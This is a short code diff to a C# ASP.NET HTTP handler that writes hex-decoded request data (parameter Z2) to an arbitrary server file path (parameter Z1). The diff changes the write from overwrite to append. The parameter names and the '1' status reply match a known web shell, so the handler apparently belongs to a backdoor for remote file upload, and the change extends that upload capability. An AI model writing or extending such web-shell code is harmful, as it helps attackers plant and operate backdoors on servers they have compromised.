@@ -172,7 +172,8 @@ public class Handler : IHttpHandler
                             {
                                 B[i / 2] = (byte)Convert.ToInt32(Z2.Substring(i, 2), 16);
                             }
-                            FileStream fs = new FileStream(Z1, FileMode.Create);
+                            FileStream fs = new FileStream(Z1, FileMode.OpenOrCreate);
+                            fs.Seek(0, SeekOrigin.End);
                             fs.Write(B, 0, B.Length);
                             fs.Close();
                             R = "1";
